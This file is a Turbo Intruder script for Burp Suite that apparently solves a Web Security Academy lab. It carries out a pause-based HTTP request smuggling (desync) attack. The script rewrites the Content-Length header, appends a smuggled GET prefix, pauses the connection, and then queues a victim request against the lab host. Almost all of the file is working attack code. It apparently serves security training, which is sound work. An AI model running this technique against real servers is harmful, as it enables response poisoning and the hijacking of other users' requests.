from javax.swing import JOptionPane,JPanel

def alert(s):
    JOptionPane.showMessageDialog(JPanel(), s, "Warning", JOptionPane.ERROR_MESSAGE)

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           timeout=130,
                           maxRetriesPerRequest=0
                           )
    pauseTime = 1000

    prefix = """GET /resources/labheader/js/labHeader.js HTTP/1.1
x: x"""

    victim = """GET /robots.txt HTTP/1.1
Host: 0a0a008304c2b2fcc072395a00ed00fd.web-security-academy.net

"""
    if not target.req.endswith('\r\n\r\n'):
        alert('raw http request not end string with \\r\\n\\r\\n ')
        return
    if '\r' not in prefix:
        prefix = prefix.replace('\n', '\r\n')
    if '\r' not in victim:
        victim = victim.replace('\n', '\r\n')
    cl = re.search(r'(Content-Length: ?\d+)', target.req, re.IGNORECASE)
    if cl is None:
        alert("can not find content-length header in target.req!")
        return
    new_req = target.req.replace(cl.group(0), 'Content-Length: '+str(len(prefix)))
    attacker = new_req + prefix
    engine.queue(attacker, pauseMarker=[new_req], pauseTime=pauseTime) # pauseBefore=len(prefix)*-1
    engine.queue(victim)

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    table.add(req)
